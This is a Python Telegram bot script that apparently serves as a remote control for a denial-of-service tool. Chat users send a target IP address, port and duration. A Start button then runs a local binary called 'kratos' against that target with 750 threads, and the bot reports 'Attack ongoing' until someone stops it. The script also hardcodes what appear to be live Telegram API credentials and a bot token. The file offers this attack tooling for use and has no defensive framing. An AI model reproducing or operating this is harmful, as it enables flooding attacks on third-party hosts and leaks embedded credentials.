from telethon import TelegramClient, events, Button
import asyncio

# Replace with your own values
api_id = "22157690"
api_hash = "819a20b5347be3a190163fff29d59d81"
bot_token = "7483201528:AAElIxI0_iaD1lxxHwcXtPBYDqZHQkaKlpE"

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# Store running processes and messages
running_processes = {}
message_ids = {}

@client.on(events.NewMessage(pattern=r"^(\d+\.\d+\.\d+\.\d+)\s(\d+)\s(\d+)$"))
async def handle_ip_port(event):
    ip, port, duration = event.pattern_match.groups()

    # Send initial message with buttons
    message = await event.respond(
        f"{ip} {port}\nStatus: ",
        buttons=[
            [Button.inline("Start", data=f"start|{ip}|{port}|{duration}")]
        ]
    )
    message_ids[(event.chat_id, ip, port)] = message.id

@client.on(events.CallbackQuery(pattern=b"(start|stop)\|(\d+\.\d+\.\d+\.\d+)\|(\d+)(?:\|(\d+))?"))
async def handle_buttons(event):
    action, ip, port, duration = event.pattern_match.groups()
    chat_id = event.chat_id
    message_id = message_ids.get((chat_id, ip.decode(), port.decode()), None)

    if action == b"start":
        if (chat_id, ip, port) in running_processes:
            return

        duration = int(duration.decode()) if duration else 60

        # Run attack and update message with status
        process = await asyncio.create_subprocess_shell(
            f"./kratos {ip.decode()} {port.decode()} {duration} 750",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes[(chat_id, ip, port)] = process
        asyncio.create_task(monitor_process(chat_id, process))

        # Update message with attack status and replace button with 'Stop'
        if message_id:
            await client.edit_message(chat_id, message_id, f"{ip.decode()} {port.decode()}\nStatus: Attack ongoing", buttons=[
                [Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
            ])

    elif action == b"stop":
        process = running_processes.pop((chat_id, ip, port), None)
        if process:
            process.terminate()

            # Update message with attack status and replace button with 'Start'
            if message_id:
                await client.edit_message(chat_id, message_id, f"{ip.decode()} {port.decode()}\nStatus: Attack stopped", buttons=[
                    [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|60")]
                ])
        else:
            return

async def monitor_process(chat_id, process):
    stdout, stderr = await process.communicate()
    if stdout:
        await client.send_message(chat_id, f"Process output: {stdout.decode()}")
    if stderr:
        await client.send_message(chat_id, f"Process error: {stderr.decode()}")

if __name__ == "__main__":
    client.run_until_disconnected()
